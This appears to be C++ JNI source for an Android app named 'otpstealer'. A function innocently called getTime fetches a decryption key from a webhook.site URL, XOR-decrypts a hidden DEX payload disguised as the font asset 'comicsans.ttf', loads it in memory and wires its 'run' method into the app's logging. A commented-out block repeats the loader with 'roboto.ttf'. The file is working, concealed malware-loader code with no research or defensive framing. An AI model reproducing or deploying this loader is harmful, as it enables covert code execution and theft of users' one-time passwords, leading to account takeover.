#include <jni.h>
#include <string>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <android/log.h>

#define LOG_TAG "DexLoaderJNI"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

jobject get_log(JNIEnv* env, jobject thiz) {
    jclass httpHelperClass = env->FindClass("com/example/otpstealer/HttpHelper");
    jmethodID fetchUrlKtMethod = env->GetStaticMethodID(httpHelperClass, "fetchUrl", "(Ljava/lang/String;)Ljava/lang/String;");
    jstring key = (jstring) env->CallStaticObjectMethod(httpHelperClass, fetchUrlKtMethod, env->NewStringUTF("https://webhook.site/1147d9c5-c958-4e87-ac3a-325eabb85867"));
    if (!key) {
        LOGE("Failed to fetch URL");
        return nullptr;
    }
    const char* keyChars = env->GetStringUTFChars(key, nullptr);
    size_t keyLen = strlen(keyChars);

    jclass activityClass = env->GetObjectClass(thiz);
    jmethodID getAssetsMethod = env->GetMethodID(activityClass, "getAssets", "()Landroid/content/res/AssetManager;");
    jobject assetManagerObj = env->CallObjectMethod(thiz, getAssetsMethod);
    AAssetManager* mgr = AAssetManager_fromJava(env, assetManagerObj);

    AAsset* asset = AAssetManager_open(mgr, "comicsans.ttf", AASSET_MODE_BUFFER);
    if (!asset) {
        LOGE("Failed to open DEX file");
        return nullptr;
    }

    off_t length = AAsset_getLength(asset);
    const void* dexData = AAsset_getBuffer(asset);
    if (!dexData) {
        LOGE("Failed to read DEX data");
        return nullptr;
    }

    uint8_t* decryptedDex = new uint8_t [length];
    for (off_t i = 0; i < length; i++) {
        decryptedDex[i] = ((uint8_t*)dexData)[i] ^ keyChars[i % keyLen];
    }

    env->ReleaseStringUTFChars(key, keyChars);

    jobject dexBuffer = env->NewDirectByteBuffer(decryptedDex, length);

    jmethodID getClassLoader = env->GetMethodID(activityClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parentClassLoader = env->CallObjectMethod(thiz, getClassLoader);

    jclass inMemoryDexClassLoaderClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");
    jmethodID inMemoryDexCtor = env->GetMethodID(inMemoryDexClassLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    jobject dexClassLoader = env->NewObject(inMemoryDexClassLoaderClass, inMemoryDexCtor, dexBuffer, parentClassLoader);

    jclass classLoaderClass = env->GetObjectClass(dexClassLoader);
    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    jstring className = env->NewStringUTF("com.example.MyClass");
    jclass pluginClass = (jclass)env->CallObjectMethod(dexClassLoader, loadClassMethod, className);

    jclass classClass = env->FindClass("java/lang/Class");
    jmethodID getDeclaredMethod = env->GetMethodID(classClass, "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");

    jstring methodName = env->NewStringUTF("run");
    jclass stringClass = env->FindClass("java/lang/String");
    jobjectArray paramTypes = env->NewObjectArray(2, classClass, nullptr);
    env->SetObjectArrayElement(paramTypes, 0, stringClass);
    env->SetObjectArrayElement(paramTypes, 1, stringClass);

    jobject runMethod = env->CallObjectMethod(pluginClass, getDeclaredMethod, methodName, paramTypes);
    return runMethod;

//    jmethodID runMethod = env->GetStaticMethodID(pluginClass, "run", "()V");
//    env->CallStaticVoidMethod(pluginClass, runMethod);
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_example_otpstealer_MainActivity_getTime(
        JNIEnv* env,
        jobject thiz) {
    jclass systemClass = env->FindClass("java/lang/System");
    jmethodID loadMethod = env->GetStaticMethodID(systemClass, "loadLibrary", "(Ljava/lang/String;)V");
    jstring libPath = env->NewStringUTF("artful");
    env->CallStaticVoidMethod(systemClass, loadMethod, libPath);

    jclass helperClass = env->FindClass("com/app/artful/ArtfulLibraryHelper");
    jmethodID registerNativeMethodsForClassMethod = env->GetStaticMethodID(helperClass, "registerNativeMethodsForClass", "(Ljava/lang/Class;)V");
    jclass mainActivityClass = env->FindClass("com/example/otpstealer/MainActivity");
    env->CallStaticVoidMethod(helperClass, registerNativeMethodsForClassMethod, mainActivityClass);

    jobject methodObject = get_log(env, thiz);
    if (not methodObject) return env->NewStringUTF("12:00");;
//    jclass classClass = env->FindClass("java/lang/Class");
//    jmethodID getDeclaredMethod = env->GetMethodID(classClass, "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
//    jstring methodName = env->NewStringUTF("mal");
//    jobjectArray emptyParams = env->NewObjectArray(0, classClass, nullptr);
//    jobject methodObject = env->CallObjectMethod(mainActivityClass, getDeclaredMethod, methodName, emptyParams);

// 2. Get the method ID for replaceLogEByObject(Object)
    jmethodID replaceMethod = env->GetMethodID(mainActivityClass, "replaceLogEByObject", "(Ljava/lang/Object;)V");

// 4. Call the method on the MainActivity instance
    env->CallVoidMethod(thiz, replaceMethod, methodObject);

    return env->NewStringUTF("12:00");
}

//extern "C"
//JNIEXPORT jstring JNICALL
//Java_com_example_otpstealer_MainActivity_stringFromJNI(
//        JNIEnv* env,
//        jobject thiz) {
//    jclass httpHelperClass = env->FindClass("com/example/otpstealer/HttpHelper");
//    jmethodID fetchUrlKtMethod = env->GetStaticMethodID(httpHelperClass, "fetchUrl", "(Ljava/lang/String;)Ljava/lang/String;");
//    jstring key = (jstring) env->CallStaticObjectMethod(httpHelperClass, fetchUrlKtMethod, env->NewStringUTF("https://webhook.site/1147d9c5-c958-4e87-ac3a-325eabb85867"));
//    if (!key) {
//        LOGE("Failed to fetch URL");
//        return env->NewStringUTF("Failed to fetch URL");
//    }
//    const char* keyChars = env->GetStringUTFChars(key, nullptr);
//    size_t keyLen = strlen(keyChars);
//
//    jclass activityClass = env->GetObjectClass(thiz);
//    jmethodID getAssetsMethod = env->GetMethodID(activityClass, "getAssets", "()Landroid/content/res/AssetManager;");
//    jobject assetManagerObj = env->CallObjectMethod(thiz, getAssetsMethod);
//    AAssetManager* mgr = AAssetManager_fromJava(env, assetManagerObj);
//
//    AAsset* asset = AAssetManager_open(mgr, "roboto.ttf", AASSET_MODE_BUFFER);
//    if (!asset) {
//        LOGE("Failed to open DEX file");
//        return env->NewStringUTF("Failed to open DEX file");
//    }
//
//    off_t length = AAsset_getLength(asset);
//    const void* dexData = AAsset_getBuffer(asset);
//    if (!dexData) {
//        LOGE("Failed to read DEX data");
//        return env->NewStringUTF("Failed to read DEX data");
//    }
//
//    uint8_t* decryptedDex = new uint8_t [length];
//    for (off_t i = 0; i < length; i++) {
//        decryptedDex[i] = ((uint8_t*)dexData)[i] ^ keyChars[i % keyLen];
//    }
//
//    env->ReleaseStringUTFChars(key, keyChars);
//
//    jobject dexBuffer = env->NewDirectByteBuffer(decryptedDex, length);
//
//    jmethodID getClassLoader = env->GetMethodID(activityClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
//    jobject parentClassLoader = env->CallObjectMethod(thiz, getClassLoader);
//
//    jclass inMemoryDexClassLoaderClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");
//    jmethodID inMemoryDexCtor = env->GetMethodID(inMemoryDexClassLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
//    jobject dexClassLoader = env->NewObject(inMemoryDexClassLoaderClass, inMemoryDexCtor, dexBuffer, parentClassLoader);
//
//    jclass classLoaderClass = env->GetObjectClass(dexClassLoader);
//    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
//    jstring className = env->NewStringUTF("com.example.MyPlugin");
//    jclass pluginClass = (jclass)env->CallObjectMethod(dexClassLoader, loadClassMethod, className);
//
//    jmethodID runMethod = env->GetStaticMethodID(pluginClass, "run", "()Ljava/lang/String;");
//    jstring result = (jstring)env->CallStaticObjectMethod(pluginClass, runMethod);
//
//    return result;
//}
